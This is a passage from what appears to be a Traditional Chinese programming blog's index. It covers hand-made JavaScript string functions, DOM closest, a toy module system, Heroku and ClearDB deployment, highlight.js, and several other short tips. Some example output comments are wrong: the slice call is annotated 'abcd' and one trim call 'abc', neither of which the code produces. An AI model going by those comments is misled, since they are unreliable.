注意要 &lt;= 才能取到終點位置字元 for(let i=first; i&lt;=last; i++) { result += s[i] } return result}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc 解法 2 =&gt; 先去掉前面的空白，再去掉後面的空白： 12345678910111213141516171819202122232425262728293031323334function trim(s) { // 儲存狀態 let isFrontWhiteSpaceFounded = false // 儲存狀態 let isBackWhiteSpaceFounded = false // 儲存去掉前面空白後的字串 let front = '' // 儲存去掉後面空白後的字串 let back = '' // 先去掉前面的空白 for(let i=0; i&lt;s.length; i++) { // 第一個非空白字元找到後，isFrontWhiteSpaceEnd 會變 true // 所以接下來出現的空白字元也都會被填入 if(s[i] !== ' ' || isFrontWhiteSpaceFounded) { front += s[i] isFrontWhiteSpaceFounded = true } } // 接著去掉後面的空白 for(let i=front.length-1; i&gt;=0; i--) { // 第一個非空白字元找到後，isBackWhiteSpaceFounded 會變 true // 所以接下來出現的空白字元也都會被填入 if(front[i] !== ' ' || isBackWhiteSpaceFounded) { // 順序要這樣才會對，不然會變成顛倒文字 back = front[i] + back isBackWhiteSpaceFounded = true } } return back}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc String.toLowerCase1234567891011121314151617function toLowerCase(s) { let result = '' for(let i=0; i&lt;s.length; i++) { // 如果是大寫字母 if(s[i]&gt;='A' &amp;&amp; s[i]&lt;='Z') { // 轉成小寫 result += String.fromCharCode(s[i].charCodeAt(0) + 32) } else { // 不是大寫字母不做處理 result += s[i] } } return result}console.log(toLowerCase('ZZVa asS a C AsABC!!!!')) // zzva ass a c asabc!!!!console.log(toLowerCase('!!!!')) // !!!!console.log(toLowerCase(' ')) // ' ' String.endsWith123456789101112131415161718192021function endsWith(str, searchString) { // 搜尋字串長度 &gt; 比對字串長度 // 搜尋字串為空字串 if(searchString.length &gt; str.length || searchString.length === 0) return false // 儲存搜尋字串最後一個字的索引值 let k = searchString.length - 1 // 反向迴圈 for(let i=str.length-1; i&gt;=0; i--) { // 比對兩字串的倒數第 n 個字是否相同 if(str[i] !== searchString[k--]) return false // 沒有字可以比了 if(k &lt; 0) break } // 符合 return true}console.log(endsWith('abc', 'c')) // trueconsole.log(endsWith('abc', 'bc')) // trueconsole.log(endsWith('abc', 'abc')) // trueconsole.log(endsWith('abc', 'aaabc')) // falseconsole.log(endsWith('abc', '')) // false String.padEnd解法 1 =&gt; 直接把填充文字填入，最後再把多餘的部分去掉： 12345678910111213141516171819202122232425function padEnd(str, targetLength, padString=' ') { // 長度 &lt;= 原字串 // 填入文字為空字串 if( targetLength &lt;= str.length || !(padString) ) return str // 結果字串 let result = '' // 未達到目標長度時不會停止 while(str.length &lt; targetLength) { // 填入文字 str += padString } // 去掉超出範圍的文字 for(let i=0; i&lt;targetLength; i++) { result += str[i] } return result}console.log(padEnd('abc', 10, 'a')) // abcaaaaaaaconsole.log(padEnd('abc', 10, 'dog')) // abcdogdogdconsole.log(padEnd('abc', 2, 'abbc')) // abcconsole.log(padEnd('abc', 2, '')) // abcconsole.log(padEnd('abc', 5)) // 'abc ' 解法 2 =&gt; 把填充文字一個字一個字加入： 123456789101112131415161718192021222324function padEnd(str, targetLength, padString=' ') { // 長度 &lt;= 原字串 // 填充文字為空字串 if( targetLength &lt;= str.length || !(padString) ) return str // 動態索引值 let k = 0 // 未達到目標長度時不會停止 while(str.length &lt; targetLength) { // 填入文字 str += padString[k++] // 已經是填充文字的最後一個字，歸零 if(k === padString.length) k=0 } // 回傳結果 return str}console.log(padEnd('abc', 10, 'a')) // abcaaaaaaaconsole.log(padEnd('abc', 10, 'dog')) // abcdogdogdconsole.log(padEnd('abc', 2, 'abbc')) // abcconsole.log(padEnd('abc', 2, '')) // abcconsole.log(padEnd('abc', 5)) // 'abc ' String.slice1234567891011121314function slice(str, start, end) { // 沒有 end 值，設為字串長度 if(!end) end = str.length // 結果 let result = '' // 根據 start end 範圍擷取文字 for(let i=start; i&lt;end; i++) { result += str[i] } // 回傳結果 return result}console.log(slice('abcdefg', 0, 3)) // abcdconsole.log(slice('abcdefg', 3, )) // defg","link":"/2021/12/21/handmade-built-in-function-string/"},{"title":"實作 DOM 的 closest 方法","text":"看到遞迴就想記下來。 簡述element.closest 是一個 DOM 的方法，用來找第一個符合「選取器」的父元素。 思路大概是這樣子： 找到上層父元素 如果父元素符合搜尋的 class 名稱，就把父元素回傳 如果上層還有元素，重複上面兩個步驟 備註：只要是 DOM 中的「元素節點」都會有 classList 屬性，所以 node.classList 是在檢查「是不是元素節點」，只要不符合就表示找到底了（最後會找到 &lt;html&gt; 的父層 -&gt; 也就是 undefined） 迴圈迭代法1234567891011function closest(node, className) { // 如果節點存在 AND 有 classList 屬性 while (node &amp;&amp; node.classList) { // 檢查 class 名稱有沒有符合，有的話就回傳節點 if (node.classList.contains(className)) { return node } // 更新節點（上一層父元素） node = node.parentNode }} 遞迴法12345678910111213function closestRecursive(node, className) { // 如果節點不存在 or 不包含 class // 回傳 null 代表找到底了 if (!node || !node.classList) { return null } // 如果符合 className，代表找到了 if (node.classList.contains(className)) { return node } // 還沒找完，繼續往上一層找 return closestRecursive(node.parentNode, className)}","link":"/2022/01/21/handmade-closest-function/"},{"title":"實作模組機制","text":"有東西搞不清楚？實作一遍就清楚了。 前情提要（注意：閱讀這篇文章前請先弄懂 理解 function 傳遞參數的機制 的內容，不然你會看得霧煞煞。） 這裡要實作的是可以在瀏覽器上運行的 module.exports 跟 require 簡單回顧一下用途，這裡有兩個檔案分別為 main.js 跟 utils.js main.js 負責引入 utils.js 中寫好的模組，如下： 123456789// utils.jsfunction calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3}module.exports = { cal: calculate, name: 'hello'} 1234// main.jsvar obj = require('./utils')console.log(obj.cal(30)) // 9console.log(obj.name) // hello 因為 obj 實際上儲存的值等同於 module.exports 等號後面的物件，所以你也可以這樣理解： 1234567// 可以想成是這樣子var obj = module.exports// 示意碼var obj = { cal: calculate, name: 'hello'} 所以換句話說，只要實作 require('./utils') 能夠回傳 module.exports 這個物件就大功告成了。 開始動工首先把 main.js 的內容用一個 function 包起來，然後傳入一個 require（一個 function）： 1234567// handmade.jsfunction main(require) { // 此處的 require 是一個 function var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name)} 接著把 utils.js 的內容也用一個 function 包起來，然後傳入一個 module（一個 object）： 123456789101112// handmade.jsfunction utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } // 此處的 module 是一個 object module.exports = { cal: calculate, name: 'hello' }} 要特別注意一點，utilis() 會把傳進來的參數 module 給新增一個 exports 屬性。 也就是說只要傳一個 object 進去，這個 object 就會被新增一個 exports 屬性來儲存模組的內容。 （再次提醒，如果你不懂這裡的運作原理，請回去複習 理解 function 傳遞參數的機制） 馬上來試試看： 1234567891011121314151617// handmade.jsfunction utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}// 用來傳入 utilis 的空物件var m = {}// 執行後 m 會被新增一個 exports 屬性儲存內容utilis(m)// { cal: [Function: calculate], name: 'hello' }console.log(m.exports) 做到這裡我們就已經完成建立 module.exports 的部分了，接著只要再讓 require(./utils) 能夠回傳 module.exports 的內容就完成了： 123456789101112// handmade.jsfunction main(require) { var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name)}var r = function(m) { // 回傳 m.exports 中的內容（物件） return m.exports}main(r) 附上完整的程式碼： 12345678910111213141516171819202122232425function utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}function main(require) { // './utils' 只是示意用，與實作內容無關 var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello}var m = {}utilis(m) // 輸出模組var r = function() { return m.exports}main(r) // 引入模組 直接複製這一段程式碼去跑，不管在 Node.js 或瀏覽器都可以正常運行。 參考資料webpack 新手教學之淺談模組化與 snowpack","link":"/2021/12/24/handmade-module-system/"},{"title":"讓 Heroku 跟 Github 同步並自動部署","text":"隨手紀錄。 簡述有一件事得先說清楚，通常會有兩種情境： 我已經在 GitHub 有 Repository，接著想部屬 AND 同步到 Heroku 我已經部屬到 Heroku 上，接著想在 GitHub 上開一個 Repository 來同步 這邊要講的是第二種，如果是第一種可以參考 這篇。 流程1. 到 GitHub 上開一個新的 Reopsitory 2. 在本地端設定一個新的 remote 指向 GitHub 1git remote add origin &lt;repository_url&gt; 3. push 到 GitHub 上 1git push origin main 4. 到 Heroku 上設定 Deploy 我懶得重弄所以這是完成後的圖，但總之它會要你先登入，再來是選擇 Repository，就照著做就好，應該不會有什麼問題。 5. 設定自動部署 第四步做完後往下滑，就會看到「Automatic deploys」的選項： 這邊可以設定分支，但我不確定是不是真的能改，總之怕麻煩的話建議用 main 就好了。 最後按下「Enable Automatic Deploys」就可以了。 這樣就完成啦，之後每當 GitHub 的 main 分支一有變動 Heroku 就會自動幫你重新部署。","link":"/2022/03/30/heroku-and-github-sync/"},{"title":"Heroko 設定資料庫 cleardb","text":"一樣做個筆記。 簡述在 Heroku 的部署流程 裡已經教過怎麼部署，但裡面的例子只適用於「靜態網站」。如果想部署「動態網站」的話只看這篇是不夠的，所以才會寫這篇來補充。 首先要知道一個觀念，Heroku 屬於 PaaS（不知道 Paas 是什麼可以看這篇 理解那些五花八門的專有名詞：IaaS、PaaS 和 SaaS），所以你沒辦法直接像在用 AWS 一樣去裝個 MySQL 或 Apache 來跑之類的，它只是個「平台」，而平台能做的事情有限。 所以呢，要在 Heroku 上跑一些額外功能的話，得透過它提供的 Add-ons 才可以。 這邊我們想要用資料庫的功能，所以會用一個叫做 cleardb 的插件來當做範例。 詳細的介紹可以參考官方文件，這邊只會簡單帶一下流程。 安裝記得是在你的 Heroku app 專案底下安裝。 附註：這邊裝的是 ignite 免費版，只能存 5MB 1heroku addons:create cleardb:ignite 順道一提，如果你的帳號沒做驗證的話可能會跳出一段訊息要你設定信用卡。因為我懶跑的驗證流程所以就直接填了，但不用擔心，這個不會收費，純粹只是做個驗證而已。 設定 Sequelize 連線到資料庫的設定（這邊是用 Sequelize 這套 ORM 來管理資料庫，所以就以 Sequelize 為主） 前面安裝好後，到你的 Heroku 裡面應該就能看到環境變數裡面多了資料庫的東西： 格式大概是長這樣：mysql://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;/&lt;db_name&gt;?reconnect=true 透過環境變數是因為我們不想要把這些敏感資訊加到 git 裡面，所以才會透過這種方式。 接著是 Sequelize 的部分，首先來看一下 /models/index.js 的檔案內容： 12345678910111213141516171819'use strict';const fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);// 檢查環境變數，有值的話就套用設定值（應該啦）const env = process.env.NODE_ENV || 'development';// 判斷要用 config.json 中的哪種版本（development | test | production）const config = require(__dirname + '/../config/config.json')[env];const db = {};let sequelize;// 根據 config 裡面有沒有 use_env_variable 屬性執行不同的 Sequelizeif (config.use_env_variable) { sequelize = new Sequelize(process.env[config.use_env_variable], config);} else { sequelize = new Sequelize(config.database, config.username, config.password, config);} 總之呢，節錄這段是想講兩個重點： 我們想用 production 的 config 我們想透過 use_env_variable 來設定連線到資料庫的值 所以接著到 config.json 來做一些調整： 123456789101112131415161718192021222324252627// config.json{ \"development\": { \"username\": \"root\", \"password\": \"root\", \"database\": \"express\", \"host\": \"localhost\", \"dialect\": \"mariadb\" }, \"test\": { \"username\": \"root\", \"password\": null, \"database\": \"database_test\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }, // 想用這一段的 config \"production\": { \"username\": \"root\", \"password\": null, \"database\": \"database_production\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\", // 我們不要直接寫在上面，而是透過環境變數來帶入 \"use_env_variable\": \"CLEARDB_DATABASE_URL\" }} 到目前為止，連線的部分就完成了。 接下來直接部署的話還是沒辦法跑的，因為我們用 Sequelize 建立資料庫時要得執行 npx sequelize db:migrate，這一步才算真的建立 table，所以得再加一段 script 才行： 12345678// package.json\"scripts\": { \"test\": \"jest\", // 新增 sequelize 指令 \"db:migrate\": \"npx sequelize db:migrate\", // 執行順序要對，先 migrate 才執行 node \"start\": \"npm run db:migrate &amp;&amp; node index.js\"} 到這一步就真的完成了，可以 push 到 Heroku 上看看囉！ 如果還是不行的話就老樣子，執行 heroku logs 來 debug 囉。 成功是成功了，但我要怎麼看資料庫裡的資料？首先官方有告訴你這一段： 簡單來說就是建議你用管理資料庫的 GUI 軟體來看。我家是 Windows 所以就用 MySQL Workbench, 來做。 接下來的步驟也很簡單，就是透過前面 cleardb 提供給你的環境變數值來設定連線就 OK 了： 這邊要填的值： Connection Name：只是名稱而已，看你想填什麼 HostName：主機名稱 Username：使用者名稱 Password：密碼 Default Schema：DB 名稱 如果前面忘記格式的話再幫你複習一次，格式是長這樣： mysql://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;/&lt;db_name&gt;?reconnect=true 把對應的值填進去就好了，成功的話就能看到資料庫中的內容了。","link":"/2022/03/28/heroku-cleardb/"},{"title":"Heroku 的部署流程","text":"簡單做個筆記。 懶人包詳細可以參考這幾個官方文件： https://devcenter.heroku.com/articles/deploying-nodejs Node.js 的部署方式 https://devcenter.heroku.com/articles/cleardb cleardb 的相關文件 https://devcenter.heroku.com/articles/procfile Procfile 的設定方式 接著是一些 Heroku 的小知識： 預設只有 master 和 main 分支會自動部署（應該） 可以在 Heroku 上設置環境變數，再讓 Node.js 取得 「Dyno」 是 Heroku 用來表示一個 APP 的用語 有自動休眠機制，一段時間沒存取 APP 的話就會先關起來，這樣可以停止計算時數。 大致流程 對專案建立 git 版控 建立一個 Heroku app push 到 Heroku 的遠端 repository 其他注意事項 設定環境變數：port 或 db 相關參數設定 設定 npm run start 的指令（Heroku 預設跑這個，不然就要另外寫 Profile） 在 package.json 設定 engines（Node.js 版本） 實際走一遍流程等一下我寫什麼你做什麼，跟著做就對了。 建立專案1mkdir myapp 初始化 NPM1npm init -y 寫專案內容這邊寫一個簡單的範例，只會顯示 Hello + 名稱： 123456789101112131415// index.jsconst express = require('express');const app = express();// 重點是這邊，記得設定環境變數 PORT// 其它就看你的 APP 需求來寫const port = process.env.PORT || 3000;const name = process.env.NAME || 'empty';app.get('/', (req, res) =&gt; { res.end('Hello, ' + name);});app.listen(port, () =&gt; { console.log(`App is running on port ${port}`);}); 設定 package.json這邊要做兩件事： 設定 npm run start 指令（告訴它這個指令要跑什麼） 設定 engines（告訴它要用哪個 Node.js 版本來跑） 12345678910111213141516{ \"name\": \"newapp\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\", \"start\": \"node index.js\" }, \"engines\": { \"node\": \"14.x\" }, \"keywords\": [], \"author\": \"\", \"license\": \"ISC\"} 建立 git 版控記得設定 .gitignore 把不必要的東西拿掉。 12git add . git commit -m 'init' 建立 Heroku 的遠端 repositoryheroku create &lt;app名稱&gt; app 名稱可填可不填，沒填的話會自動產生。 1heroku create my-awesome-peanu-app 看到這個就代表建立成功： 12# app 網址 | remote repositoryhttps://my-awesome-peanu-app.herokuapp.com/ | https://git.heroku.com/my-awesome-peanu-app.git 這邊可以用 git remote -v 來做確認： 123git remote -vheroku https://git.heroku.com/my-awesome-peanu-app.git (fetch)heroku https://git.heroku.com/my-awesome-peanu-app.git (push) 把專案 push 上去1git push heroku master 基本上沒出現 Error log 的話就代表部署成功。接著就可以打開來看了： 1heroku open 這樣就部署完成囉，恭喜恭喜： 附註關於 debug如果最後打開網站後發現異常，那就只能靠你自己了，請執行這個指令： 1heroku logs 直接看 log 寫了什麼然後去 debug 吧，通常都會寫得蠻清楚的，加油囉！ 修改 App 名稱可以到 Settings 頁面： 直接改完 Save 就可以了，不過要注意改完後得重新設定 remote 的 repository： 12git remote rm herokuheroku git:remote -a newname","link":"/2022/03/28/heroku-deploy/"},{"title":"highlight.js 的使用方法","text":"寫起來不怕以後忘記。 引入方式highlight.js 主要就兩隻檔案： 每個主題的 CSS 檔案 渲染程式碼區塊的 JavaScript 檔案 這邊我只列幾個比較方便的，詳細請直接參考這裡。 CDN 引入 12&lt;link rel=\"stylesheet\" href=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/default.min.css\"&gt;&lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js\"&gt;&lt;/script&gt; 像 default.min.css 可以換成自己喜歡的主題，例如：agate.min.css 如果不知道有些主題的檔名是什麼，建議直接下載檔案來看就知道了（像 A 11 Y DARK 的檔名是 a11y-dark.min.css）。 把檔案下載到電腦，再指定檔案路徑 先到這裡下載檔案，滑到下面選擇要支援的語言，再按 Dowload 就好囉。 1234&lt;!-- css (tomorrow-night-bright) --&gt;&lt;link rel=\"stylesheet\" href=\"./plug-in/highlight_js/tomorrow-night-bright.min.css\"&gt;&lt;!-- js --&gt;&lt;script src=\"./plug-in/highlight_js/highlight.min.js\"&gt;&lt;/script&gt; 這樣引入的部分就完成了。 啟動方式highlight.js 的原理是在 DOM 載入時自動去抓 pre 跟 code 的部分來渲染程式碼區塊，所以假設有段 HTML 如下： 123&lt;pre&gt; &lt;code class=\"language-javascript\"&gt;console.log('yo')&lt;/code&gt;&lt;/pre&gt; （它是用 class 來判斷語言的，雖然說有自動偵測的功能，但還是建議加一下比較好。） 接著記得加上下面的 code 來啟用 highlight.js： 123&lt;script&gt; hljs.highlightAll();&lt;/script&gt; 這樣就會看到水噹噹的 code 囉： 補充－加上程式碼行數highlight.js 本身是沒有行數功能的，所以要到這裡下載另一個套件。 文件裡有詳細寫要怎麼安裝跟使用，這邊只示範我的作法： 引入檔案 123&lt;script src=\"path/to/highlight.min.js\"&gt;&lt;/script&gt;&lt;!-- 它依賴 highlight.js，所以要記得放在後面 --&gt;&lt;script src=\"path/to/highlightjs-line-numbers.min.js\"&gt;&lt;/script&gt; 啟動方式 1234&lt;script&gt; hljs.highlightAll(); hljs.initLineNumbersOnLoad();&lt;/script&gt; 接著就會顯示行數了： 不過顯而易見，這套件似乎沒預設樣式，所以我加了一段 CSS 來優化： 12345678910111213141516171819202122232425262728293031323334353637383940414243/* 這段是改 highlight.js 的 CSS 樣式， 所以要記得放在後面才不會被覆寫。*/pre code.hljs { padding: 0;}/* 數字區塊的樣式 */.hljs-ln-numbers { -webkit-touch-callout: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; text-align: center; color: #EAEAEA; vertical-align: top; padding-top: 0.1em !important; padding-bottom: 0.1em !important; padding-left: 1em !important; padding-right: 1em !important; background-color: rgb(255 255 255 / 15%);}/* 程式區塊的樣式 */.hljs-ln-code { padding-left: 0.8em !important;}/* 下面是一些對齊的處理 */.hljs-ln tr:first-child .hljs-ln-numbers { padding-top: 0.8em !important;}.hljs-ln tr:last-child .hljs-ln-numbers { padding-bottom: 0.8em !important;}.hljs-ln tr:first-child .hljs-ln-code { vertical-align: bottom;}.hljs-ln tr:last-child .hljs-ln-code { vertical-align: top;}.hljs-ln tr:only-child .hljs-ln-code{ vertical-align: middle;} 這樣就好看多了。 補充一些 Options 只有一行時要不要顯示行數 123hljs.initLineNumbersOnLoad({ singleLine: true}); 設定第一行的起始數字 123hljs.lineNumbersBlock(myCodeBlock, { startFrom: 10});","link":"/2022/02/20/highlight-js-usage/"},{"title":"幾個水桶？","text":"這是來自 LIOJ 上的題目，因為解法很有趣，所以想記錄下來。 最原始的解法這個方法最直覺，也是我最一開始的解法： n = 水量 count = 水桶數量 遍歷 2^0 到 2^31 每當找到比 n 大的數字，更新 n 的值，count + 1 重複 3-4，直到 n 為 0 12345678910111213141516171819202122232425262728293031323334function solve(lines) { // 所需水量 let capacity = Number(lines[0]) // 計數器 let count = 0 // 只要 capacity &gt; 0，就會一直執行 while (capacity) { // 找出最大的水桶 let max = findMaxBucket(capacity) // 把水桶裝滿後，更新水量 capacity -= 2**max // 計數器 + 1 count++ } // 印出幾個水桶 console.log(count)}function findMaxBucket(n) { /* 找出最大值，最大值有兩個可能： 1. 超過 n，代表前一個數字就是最大值 2. 等於 n，代表這個數字就是最大值 */ for (let i=0; i&lt;=31; i++) { // 等於 n if(2**i === n) { return i // 超過 n } else if (2**i &gt; n) { return i-1 } }}solve(['20']) // 2 這樣做的缺點是「會有不同的回傳值」： 超過 n 的情況回傳 i - 1 等於 n 的情況回傳 i 在 findMaxBucket 裡面，因為兩種情況的回傳值不同，所以需要多做一層判斷。 其實可以反過來思考：不要「從小找到大」，而是「從大找到小」 在從小找到大時，因為實際上要的水桶是「前一個（i - 1）」，所以得回傳 i - 1；但如果是從大找到小，實際上要的水桶正好就是 i，所以可以直接回傳 i。 也就是說，不管小於或等於的情況，回傳的值都是 i，就不用多寫一層判斷，而是直接利用 &lt;= 來判斷即可。 可以參考下面的解法。 聰明一點的解法把剛剛的作法修正一下，寫出更簡潔的程式碼： n = 水量 count = 水桶數量 遍歷 2^31 ~ 2^0 每當找到比 n 小的數字，更新 n 的值，count++ 重複 4-5，直到 n 為 0 12345678910111213141516171819202122232425262728function solve(lines) { // 所需水量 let capacity = Number(lines[0]) // 計數器 let count = 0 // 只要 capacity &gt; 0，就會一直執行 while (capacity) { // 找出最大的水桶 let max = findMaxBucket(capacity) // 把水桶裝滿後，更新水量 capacity -= 2**max // 計數器 + 1 count++ } // 印出幾個水桶 console.log(count)}function findMaxBucket(n) { // 從大找到小 for (let i=31; i&gt;=0; i--) { // 不管小於等於的回傳值都是 i if(2**i &lt;= n) { return i } }}solve(['20']) // 2 有趣的做法如果你懂二進位的話，你會發現這一題背後其實只是在問 「n 轉成二進位後有幾個 1」？ 以 20 為例，20 的二進位是 10100。你仔細看的話就會發現 1 出現的次數正好就是最佳的水桶數量，所以解法就會是： n = 水量 count = 水桶數量 把 n 轉成二進位（字串） 遍歷 n 的每一個字元，算出總共有幾個 1 123456789101112131415161718192021222324252627function solve(lines) { // 所需水量 let capacity = Number(lines[0]) // 計數器 let count = 0 // 轉成二進位 let binaryString = transToBinary(capacity) // 遍歷二進位值，算出有幾個 1 for(let i=0; i&lt;binaryString.length; i++) { if(binaryString[i] === '1') count++ } console.log(count)}function transToBinary(n) { let result = '' /* 只要 n &gt; 0，繼續把 n 除以 2 求餘數 把每一次除以 2 的餘數拼接到 result */ while(n) { result = (n%2) + result // 要記得去掉小數點 n = Math.floor(n/2) } return result}solve(['20']) // 2 提醒一下，let binaryString = transToBinary(capacity) 可以寫成： let binaryString = capacity.toString(2)，不用像我一樣傻傻的做轉換。 所以這一題就這樣解決囉。 還有更酷的作法？其實就是剛剛的延伸，你可以直接利用「位移」和「位元運算」來計算一個數字有幾個 1。 注意：用這個方法就不用再把數字先轉成二進位了，因為位移跟位元運算會以「十進位」來解析數字。如果你又轉成二進位，例如 20 = 10100，這時候 10100 就會被當作十進位來解析。 檢查最後一個數字是不是 1 n &amp; 1 是的話把 count++ 更新 n 的值 n &gt;&gt;= 1 12345678910111213141516function solve(lines) { // 所需水量 let capacity = Number(lines[0]) // 計數器 let count = 0 // capacity = 0 時才會停止 while(capacity) { // 做 AND 位元運算 if(capacity &amp; 1) { count++ } // 利用位移更新 capacity 的值 capacity &gt;&gt;= 1 } console.log(count)}","link":"/2021/12/22/how-many-buckets/"},{"title":"一些 google 的小技巧","text":"順手記下來 排除不要的結果（-）假設我想找買一送一： 但我不想被星巴克洗版，我可以改搜尋 買一送一 -星巴克（要空一格）： 這樣就乾淨多了。 一字不漏的搜尋（”）例如我搜尋豬排飯： 我明明就搜尋豬排還跳出雞排是怎樣？改成 \"豬排咖哩飯\" 來讓它一字不漏的搜尋，順便縮小範圍： 快速找去背圖（.png）不解釋，一個找透明圖的好辦法，絕對實用：","link":"/2022/02/09/how-to-google/"},{"title":"如何正確的隱藏文字","text":"好多種方法。 使用時機與用法有些時候為了 HTML 語意或無障礙設計，會在標籤中填入一些文字內容，但實際上卻不想顯示這些文字，這時候就會透過 CSS 來把這些文字內容來隱藏起來。 但是要如何正確地隱藏他們？如果沒有用正確的方法，這個標籤會被當作不存在，進而影響 HTML 的「合法性（Validations）」，所以我個人的建議是這樣子： 1&lt;h2 class=\"hide\"&gt;一個標題，但我不想要顯示它&lt;/h2&gt; 1234567891011.hide { position: absolute; top: 0; left: 0; width: 0; height: 0; z-index: -9999; text-indent: 100%; white-space: nowrap; overflow: hidden;} 以我個人的實際經驗，這樣子的寫法是不會有問題的。 簡單說明一下它做了什麼： 設為 absolute，並定位到左上角 z-index: -9999，總之就是最底層 寬高設為 0 最後三行則是讓文字超出範圍並隱藏 那什麼是不恰當的做法？ display: none visibility: hidden 這兩個都會讓標籤被當作不存在。 補充後來還發現了一些新的方法，所以也記錄下來。 12345678910.hide { position: absolute; height: 1px; width: 1px; clip: rect(1px 1px 1px 1px); clip: rect(1px, 1px, 1px, 1px); clip-path: polygon(0px 0px, 0px 0px, 0px 0px, 0px 0px); -webkit-clip-path: polygon(0px 0px, 0px 0px, 0px 0px, 0px 0px); overflow: hidden !important;} 12345.hide { position: absolute !important; top: -9999px !important; left: -9999px !important;}","link":"/2022/01/16/how-to-hide-text/"},{"title":"想遵循的變數命名方式","text":"之前有寫過一篇 變數的命名哲學，不過寫的不是很完整。最近剛好看到這這篇 文章，覺得寫得還不錯，所以想參照它的內容來打造自己的 coding style。 基本規則這裡直接把以前寫的貼過來： 小寫駝峰式（Camel case）maxNumber 小寫開頭，單字連接的部分變成大小。因為很像駱駝的背，所以被稱為駝峰式 大寫駝峰式（Pascal case）MaxNumber，就是開頭變成大寫這樣 蛇型式（Snake case）max_value，用底線隔開單字，底線像蛇所以才叫 snake 串燒式（Kebab case）max-value，用 - 隔開單字，kebab 是烤肉串的意思（因為這種寫法很像串燒） 接下來會根據 變數、常數、函數、類（class）、類成員 來分別解釋一下該用哪種命名格式跟建議比較恰當。 變數 命名格式：小寫駝峰式 命名建議：以名詞 來開頭 另外最好取的貼切一點，像 length、count 很明顯代表「數字」，而 name、title 就表示「字串」。 example: 123456// 正確的寫法let maxCount = 10let tableTitle = 'LoginTable'// 不正確的寫法let setCount = 10let getTitle = 'LoginTable' 常數 命名格式：全部都大寫，用下底線分隔單字 example: 12const MAX_COUNT = 10const URL = 'http://www.foreverz.com' 函數 命名格式：小寫駝峰式 命名建議：以動詞 來開頭 附上一些常見的約定俗成： 動詞 意思 回傳值 can 判斷是否能執行某個動作 true：可以，false：不可以 has 判斷是否包含某個值 true：有包含，false：沒有包含 is 判斷是否為某個值 true：有，false：沒有 get 取得某個值 回傳取得的值 set 設定某個值 沒有回傳值或回傳是否成功 load 讀取資料 沒有回傳值或回傳是否成功失敗 example: 12345678// 是否可以閱讀function canRead() { return true}// 取得名稱function getName() { return 'PeaNu'} 類（class） 命名格式：大寫駝峰式 命名建議：以名詞 來開頭 example: 1234567class Person { public name: string constructor(name) { this.name = name }}const person = new Person('mevyn') 類成員 公開屬性和方法：跟變數和函數的命名相同。 私有屬性和方法：前綴用下底線來表示，後面就一般作法。 example: 12345678910111213141516class Person { // 私有屬性 private _name: string constructor() { } // 公開方法 getName() { return this._name } // 公開方法 setName() { return this._name = name }}const person = new Person()person.setName('PeaNu')person.getName() // -&gt;PeaNu 註解寫註解其實也能是一種 coding style。 命名建議： 123// 用來顯示單行註解// -&gt; 用來顯示表達式的結果// &gt; 用來顯示 console 的輸出結果 example: 1234function test() { console.log('Hello') // &gt; Hello return 3 + 2 // -&gt; 5} 多行註解的建議： 12345/* * 第一行註解 * 第二行註解 * 第三行註解 */","link":"/2022/01/08/how-to-name-your-variable/"},{"title":"關於 <script> 的放置位置","text":"該知道的知識。 舉例來說如果我們想要存取某個元素，但沒有把 &lt;script&gt; 放在對的地方，結果就會不如預期。 放在 &lt;head&gt; 的情況HTML： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;標題&lt;/title&gt; &lt;script&gt; // 抓 &lt;div&gt; const element = document.getElementsByTagName('div')[0] // log 出來 console.log(element) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;yoyoyo&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; console： 1undefined 放在 &lt;/body&gt; 的情況HTML： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;標題&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;yoyoyo&lt;/div&gt; &lt;script&gt; // 抓 &lt;div&gt; const element = document.getElementsByTagName('div')[0] // log 出來 console.log(element) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; console： 1&lt;div&gt;yoyoyo&lt;/div&gt; Why？當放在 &lt;head&gt; 中，執行到 JavaScript 時，下面 &lt;body&gt; 內容還沒有產生，所以當然抓不到任何東西。 但是放在 &lt;/body&gt; 前，執行到 JavaScript 時，內容已經產生好了，這時候就抓的到東西。 這也就是為什麼大家都習慣把 JavaScript 寫在 &lt;/body&gt; 前的原因。","link":"/2022/01/18/how-to-place-script-tag/"},{"title":"我想要發 pull request 到別人的專案要怎麼做？","text":"如題 流程我： 把檔案 fork 到自己的 repository 把 fork 過來的 repository 到自己的本地端 建立一個新的分支，接著在改你要修改的地方（不建立新分支也可以，但我覺得這樣會比較好） 修改完後，別忘了 commit 把新的分支的內容 push 回自己的 repository 在自己的 repository 中的 Pull requests 頁面新增一個 pull request 填寫你想寫的內容，以及想要合併到作者的哪個分支 送出 pull request 作者： 收到我發的 pull request 做 Code review 確認沒問題，按下同意後，就會把我的內容合併到我指定的分支去 結束～ 